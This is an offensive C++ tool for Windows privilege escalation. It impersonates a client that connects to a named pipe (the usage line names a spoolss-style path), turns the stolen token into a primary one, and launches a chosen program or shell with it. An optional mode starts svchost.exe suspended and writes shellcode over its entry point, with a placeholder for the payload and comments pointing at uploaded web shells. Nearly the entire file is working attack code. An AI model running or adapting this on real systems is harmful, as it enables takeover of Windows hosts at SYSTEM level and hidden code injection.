#include <iostream>
#include <Windows.h>
#include <userenv.h>
#include <namedpipeapi.h>
#include <winbase.h>
#include <securitybaseapi.h>
#include <sddl.h>
#include <subauth.h>
#pragma comment(lib, "userenv.lib")

#define INJECTION 0
#define INITDESKTOP

#ifdef INJECTION

using PPS_POST_PROCESS_INIT_ROUTINE = void*;
using KPRIORITY = void*;

typedef struct _PEB_LDR_DATA {
    BYTE       Reserved1[8];
    PVOID      Reserved2[3];
    LIST_ENTRY InMemoryOrderModuleList;
} PEB_LDR_DATA, * PPEB_LDR_DATA;

typedef struct _RTL_USER_PROCESS_PARAMETERS {
    BYTE           Reserved1[16];
    PVOID          Reserved2[10];
    UNICODE_STRING ImagePathName;
    UNICODE_STRING CommandLine;
} RTL_USER_PROCESS_PARAMETERS, * PRTL_USER_PROCESS_PARAMETERS;

typedef struct _PEB {
    BYTE                          Reserved1[2];
    BYTE                          BeingDebugged;
    BYTE                          Reserved2[1];
    PVOID                         Reserved3[2];
    PPEB_LDR_DATA                 Ldr;
    PRTL_USER_PROCESS_PARAMETERS  ProcessParameters;
    PVOID                         Reserved4[3];
    PVOID                         AtlThunkSListPtr;
    PVOID                         Reserved5;
    ULONG                         Reserved6;
    PVOID                         Reserved7;
    ULONG                         Reserved8;
    ULONG                         AtlThunkSListPtr32;
    PVOID                         Reserved9[45];
    BYTE                          Reserved10[96];
    PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine;
    BYTE                          Reserved11[128];
    PVOID                         Reserved12[1];
    ULONG                         SessionId;
} PEB, * PPEB;

typedef struct _PROCESS_BASIC_INFORMATION {
    NTSTATUS ExitStatus;
    PPEB PebBaseAddress;
    ULONG_PTR AffinityMask;
    KPRIORITY BasePriority;
    ULONG_PTR UniqueProcessId;
    ULONG_PTR InheritedFromUniqueProcessId;
} PROCESS_BASIC_INFORMATION;

FARPROC getHandler(HMODULE module, std::string procName) {
    return GetProcAddress(module, procName.c_str());
}

FARPROC getHandler(std::wstring module, std::string procName) {
    return GetProcAddress(LoadLibraryW(module.c_str()), procName.c_str());
}

enum PROCESSINFOCLASS {
    ProcessBasicInformation = 0
};

typedef NTSTATUS(*_ZwQueryInformationProcess)(
    _In_      HANDLE           ProcessHandle,
    _In_      PROCESSINFOCLASS ProcessInformationClass,
    _Out_     PVOID            ProcessInformation,
    _In_      ULONG            ProcessInformationLength,
    _Out_opt_ PULONG           ReturnLength
    );

#endif

#ifdef INJECTION
    void spawnme_inj(HANDLE& ptoken);
#else
    void spawnme(HANDLE& ptoken, wchar_t[]);
#endif

int main(int argc, char **argv)
{
    if (argc < 3) {
        std::cout << "[!] Missing arguments! @1 pipe path: \\\\.\\pipe\\test\\pipe\\spoolss, @2 what to run, or file with shell" << std::endl;
        return -1;
    }        
    HANDLE pipe = CreateNamedPipeA(argv[1], PIPE_ACCESS_DUPLEX, PIPE_TYPE_BYTE | PIPE_WAIT, 255, 0x1000, 0x1000, 0, NULL);
    std::cout << "[i] Connecting to pipe " << argv[1] << std::endl;
    if (ConnectNamedPipe(pipe, NULL)) {
        std::cout << "[i] Pipe received data, impersonating\n";
        if (ImpersonateNamedPipeClient(pipe)) {
            std::cout << "[i] Openning thread token\n";
            HANDLE thandle{ 0 };
            if (OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, TRUE, &thandle)) {
                std::cout << "[i] OpenThreadToken done\n";
                DWORD rlen{ 0 };
                // error je zamerem, vrati potrebno velikost bufferu, druhe call pak uz se skutecnym bufferem
                if (!GetTokenInformation(thandle, TOKEN_INFORMATION_CLASS::TokenUser, NULL, 0, &rlen)) {
                    std::cout << "[i] GetTokenInformation need to read " << (int)rlen << " bytes\n";
                    std::unique_ptr<BYTE[]> tokenInformation = std::make_unique<BYTE[]>(rlen);
                    if (GetTokenInformation(thandle, TOKEN_INFORMATION_CLASS::TokenUser, tokenInformation.get(), rlen, &rlen)) {
                        std::cout << "[i] 2. GetTokenInformation received structure\n";
                        TOKEN_USER* tokenUser = reinterpret_cast<TOKEN_USER*>(tokenInformation.get());
                        LPSTR strsid{ 0 };
                        if (ConvertSidToStringSidA(tokenUser->User.Sid, &strsid)) {
                            std::cout << "[*] Received SID: " << strsid << std::endl;
                            LocalFree(strsid);
                            std::cout << "[i] Setting token as primary" << std::endl;
                            HANDLE ptoken{ 0 };
                            
                            if (DuplicateTokenEx(thandle, MAXIMUM_ALLOWED, NULL, SECURITY_IMPERSONATION_LEVEL::SecurityDelegation, TOKEN_TYPE::TokenPrimary, &ptoken)) {
                            //if (DuplicateTokenEx(thandle, TOKEN_ALL_ACCESS, NULL, SECURITY_IMPERSONATION_LEVEL::SecurityImpersonation, TOKEN_TYPE::TokenPrimary, &ptoken)) {
                                //std::cout << "[i] Going to spawn the shell" << std::endl;

#ifdef INJECTION
                                spawnme_inj(ptoken);
#else
                                std::unique_ptr<wchar_t[]> fexe = std::make_unique<wchar_t[]>(strlen(argv[2]) + 1);
                                mbstowcs_s(nullptr, fexe.get(), strlen(argv[2]) + 1, argv[2], strlen(argv[2]));
                                spawnme(ptoken, fexe.get());
#endif
                                std::cout << "[i] Done spawnme" << std::endl;
                            }
                            else
                                printf("DuplicateTokenEx: %08x", GetLastError());
                        }
                        else
                            std::cout << "ConvertSidToStringSidA: " << std::hex << GetLastError() << std::endl;
                    }
                    else
                        std::cout << "2. GetTokenInformation: " << std::hex << GetLastError() << std::endl;
                }
                else
                    printf("GetTokenInformation: %08x\n", GetLastError());
            }
            else
                printf("OpenThreadTokeN: %08x\n", GetLastError());
        }
        else
            std::cout << "ImpersonateNamedPipeClient: " << std::hex << GetLastError() << std::endl;
    }
    else
        std::cout << "ConnectNamedPipe: " << std::hex << GetLastError() << std::endl;
    return 0;
}

inline uint8_t _xor(uint8_t orig, uint8_t* key, uint8_t keyl) {
    return ([&]()->uint8_t {
        for (int i = 0; i < keyl; i++) { orig ^= key[i]; } return orig; }()) & 0xFF;
}

inline uint8_t _ceasar(uint8_t orig, uint8_t shift) {
    return ((orig + shift) & 0xFF);
}


#ifndef INJECTION
void spawnme(HANDLE& ptoken, wchar_t fexe[]) {
    std::wcout << "[i] Postim externi prdu!! " << fexe << std::endl;

    //wchar_t fexe[]{ L"C:\\inetpub\\wwwroot\\upload\\shell.exe" };
    STARTUPINFO si;
    //bi.PebBaseAddress = ppeb;
    PROCESS_INFORMATION pi;    
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(STARTUPINFO);
    //Nemam interaktivni desktop - tudiz proces, a chcu
    // impersonovat system user, tak explicitne musim rict ze chcu desktop, jinak by vytvoreni procesu selhalo
    // Winsta0\Default - emuluju login session 
    // Priprava na vytvoreni procesu s tokenem
#ifdef INITDESKTOP
    wchar_t deskt[]{ L"WinSta0\\Default" };
    si.lpDesktop = deskt;    
    std::unique_ptr<wchar_t[]> curDir = std::make_unique<wchar_t[]>(512);
    ZeroMemory(curDir.get(), 512);
    if (!GetSystemDirectoryW(curDir.get(), 512)) {
        std::cout << "[!] Cannot get system directory!" << std::endl;
        return;
    }
    std::wcout << "[i] Resolved systemdirectory: " << (const wchar_t*)curDir.get() << std::endl;
    LPVOID lpEnv{ 0 };
    if (!CreateEnvironmentBlock(&lpEnv, ptoken, FALSE)) {
        std::cout << "[!] Cannot get Environment Block!" << std::endl;
        return;
    }
    RevertToSelf();    
    //wchar_t fexe[]{ L"C:\\inetpub\\wwwroot\\upload\\shell.exe" };    
    if (CreateProcessWithTokenW(ptoken, LOGON_WITH_PROFILE, NULL, fexe, CREATE_UNICODE_ENVIRONMENT, lpEnv, curDir.get(), &si, &pi)) {
        std::cout << "[i] Should be spawned" << std::endl;        
    }        
#else
    if (CreateProcessWithTokenW(ptoken, NULL, NULL, fexe, CREATE_SUSPENDED | CREATE_UNICODE_ENVIRONMENT, NULL, NULL, &si, &pi)) {
        std::cout << "[i] Should be spawned" << std::endl;
    }    
#endif
    else {
        DWORD err = GetLastError();
        printf("CreateProcess failed (%d).\n", err);
    }
#ifdef INITDESKTOP
    DestroyEnvironmentBlock(lpEnv);
#endif
}
#endif

#ifdef INJECTION
void spawnme_inj(HANDLE& ptoken) {    
    std::cout << "[i] In spawnme" << std::endl;

    {SHELLCODE_TO_REPLACE}   

    HMODULE mod = LoadLibraryW(L"C:\\Windows\\System32\\ntdll.dll");
    if (!mod) {
        std::cout << "[!] Bad ntdll.dll handler!" << std::endl;
        return;
    }
    _ZwQueryInformationProcess ZwQueryInformationProcess = (_ZwQueryInformationProcess)getHandler(mod, "ZwQueryInformationProcess");
    
    //std::cout << "[i0a] Going to spawn!!" << std::endl;
    //_CreateEnvironmentBlock CreateEnvironmentBlock = (_CreateEnvironmentBlock)getHandler(usrenv, "CreateEnvironmentBlock");
    //_DestroyEnvironmentBlock DestroyEnvironmentBlock = (_DestroyEnvironmentBlock)getHandler(usrenv, "DestroyEnvironmentBlock");
    std::cout << "[i0b] Going to spawn!!" << std::endl;

    PROCESS_BASIC_INFORMATION bi;
    PPEB ppeb{ nullptr };
    STARTUPINFO si;
    //bi.PebBaseAddress = ppeb;
    PROCESS_INFORMATION pi;
    ZeroMemory(&bi, sizeof(PROCESS_BASIC_INFORMATION));
    ZeroMemory(&si, sizeof(STARTUPINFO));
    ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
    si.cb = sizeof(STARTUPINFO);
    //Nemam interaktivni desktop - tudiz proces, a chcu
    // impersonovat system user, tak explicitne musim rict ze chcu desktop, jinak by vytvoreni procesu selhalo
    // Winsta0\Default - emuluju login session 
    // Priprava na vytvoreni procesu s tokenem
    
    wchar_t deskt[]{ L"WinSta0\\Default" };
    si.lpDesktop = deskt;
    std::cout << "[i1] Going to spawn!!" << std::endl;    
    std::unique_ptr<wchar_t[]> curDir = std::make_unique<wchar_t[]>(512);
    ZeroMemory(curDir.get(), 512);
    std::cout << "[i1] Going to spawn!!" << std::endl;
    if (!GetSystemDirectoryW(curDir.get(), 512)) {
        std::cout << "[!] Cannot get system directory!" << std::endl;
        return;
    }
    std::wcout << "[i] Resolved systemdirectory: " << (const wchar_t *)curDir.get() << std::endl;
    LPVOID lpEnv{ 0 };
    if (!CreateEnvironmentBlock(&lpEnv, ptoken, FALSE)) {        
        std::cout << "[!] Cannot get Environment Block!" << std::endl;
        return;
    }    

    std::wcout << "[!!] >>>> " << (wchar_t*)lpEnv << std::endl;
    printf("[i3] Going to spawn!!\n");
    //------------------------------------------
    
    NTSTATUS ret{ STATUS_SUCCESS };
    //wchar_t fexe[]{ L"C:\\Windows\\System32\\cmd.exe" };
    RevertToSelf();
    
    //NTSTATUS ret{ STATUS_SUCCESS };
    wchar_t fexe[]{ L"C:\\Windows\\System32\\svchost.exe" };
    //wchar_t fexe[]{ L"C:\\inetpub\\wwwroot\\upload\\shell.exe" };    
    BOOL iswow{ false };
    if (CreateProcessWithTokenW(ptoken, NULL, NULL, fexe, CREATE_SUSPENDED | CREATE_UNICODE_ENVIRONMENT, lpEnv, curDir.get(), &si, &pi)) {
    //if (CreateProcessWithTokenW(ptoken, NULL, NULL, fexe, CREATE_SUSPENDED , NULL, NULL, &si, &pi)) {        
        IsWow64Process(pi.hProcess, &iswow);
        std::cout << "ISWOW64: " << iswow << std::endl;
        DestroyEnvironmentBlock(lpEnv);
        ULONG dataRetLen{ 0 };        
        if (!(ret = ZwQueryInformationProcess(pi.hProcess, PROCESSINFOCLASS::ProcessBasicInformation, &bi, sizeof(PROCESS_BASIC_INFORMATION), &dataRetLen))) {
            printf("[i] Exit status %s\n", (bi.ExitStatus == 259)?"STATUS_PENDING":"unknown");
            printf("[i] Got %d bytes from process info\n", dataRetLen);
            ppeb = bi.PebBaseAddress;
            printf("[i] PEB address 0x%p\n", bi.PebBaseAddress);
            int64_t ptrToEXEImage{ (int64_t)bi.PebBaseAddress + 0x10 };
            printf("[i] EXE Code begins 0x%p\n", ptrToEXEImage);
            int64_t peHeaderBeg{ 0 };
            std::unique_ptr<uint8_t[]> buffer = std::make_unique<uint8_t[]>(0x200);
            SIZE_T readBytes{ 0 };
            ReadProcessMemory(pi.hProcess, (const void*)ptrToEXEImage, (uint8_t*)&peHeaderBeg, sizeof(int64_t), &readBytes);
            printf("[i] 1. PE Header begins 0x%I64x\n", peHeaderBeg);
            if (readBytes == sizeof(int64_t)) {
                printf("[i] 2. PE Header begins 0x%I64x\n", peHeaderBeg);
                ReadProcessMemory(pi.hProcess, (const void*)peHeaderBeg, buffer.get(), 0x200, &readBytes);
                if (readBytes == 0x200) {
                    int32_t e_lfanew{ 0 };
                    //offset e_lfanew k PE Signature
                    memcpy(&e_lfanew, buffer.get() + 0x3c, sizeof(e_lfanew));
                    printf("[i] e_lfanew offset size 0x%x\n", e_lfanew);
                    int64_t entrypoint{ 0 };
                    int32_t rva_offset{ 0 };
                    //offset k RVA
                    int64_t offset = e_lfanew + 0x28;
                    memcpy(&rva_offset, buffer.get() + offset, sizeof(int32_t));
                    //Absolutni virtualni adresa pameti
                    entrypoint = peHeaderBeg + rva_offset;
                    printf("[i] Entrypoint found at 0x%I64x\n", entrypoint);
                    SIZE_T wBytes{ 0 };

                    WriteProcessMemory(pi.hProcess, (LPVOID)entrypoint, buf.get(), bufsz, &wBytes);
                    if (wBytes == bufsz) {
                        printf("[i] Resuming thread, should be shell\n");
                        ResumeThread(pi.hThread);
                        //WaitForSingleObject(pi.hProcess, INFINITE);
                    }
                    else {
                        printf("[!] Written bytes not match! w:%d / needed: %d\n", (int32_t)wBytes, (int32_t)sizeof(buf));
                        printf("Write mem failed (%d).\n", GetLastError());
                    }
                    CloseHandle(pi.hProcess);
                    CloseHandle(pi.hThread);
                }
                else
                    printf("Read mem 0x200 bytes failed (%d).\n", GetLastError());
            }
            else
                printf("Read mem 8 bytes failed (%d).\n", GetLastError());
        }
        else
            printf("[!] Failed to get process info (ret: %x / %d)\n", ret, GetLastError());
    }
    else {
        DWORD err = GetLastError();
        printf("CreateProcess failed (%d).\n", err);
    }
}

#endif
